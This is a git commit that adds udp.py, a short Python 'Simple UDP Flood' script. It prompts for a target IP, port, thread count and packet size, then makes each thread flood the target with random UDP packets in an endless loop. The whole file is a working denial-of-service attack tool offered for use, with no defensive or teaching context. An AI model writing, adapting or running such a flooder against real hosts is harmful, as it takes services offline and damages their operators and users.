81b46065a7e251b9efd9200c1ed21ca70c413b98
PhynX <48216256+PhynX404@users.noreply.github.com>
2021-08-30 14:12:24 +0700

    Create udp.py

---
+++ udp.py
@@ -0,0 +1,32 @@
+# Simple UDP Flood
+# -*- coding: utf-8 -*-
+import os, sys
+import threading
+import random
+import socket
+
+def main():
+  global ip, port, threads, conn, psize
+  print("""
+  Simple UDP Flood
+  """)
+  ip = str(input("IP Target: "))
+  port = int(input("Port Target: "))
+  threads = int(input("Threads "))
+  conn = int(input("Multi Packet: "))
+  psize = int(input("Packet Size: "))
+  for x in range(threads):
+    t = threading.Thread(target=attack)
+    t.start()
+
+def attack():
+  pkt = random._urandom(psize)
+  while True:
+    try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+      s.sendto(pkt, (ip,port))
+      print("Sending "+str(len(pkt))+" to => "+ip+":"+str(port))
+      for y in range(conn):
+        s.sendto(pkt, (ip,port))
+    except:
+      s.sendto(pkt, (ip,port))
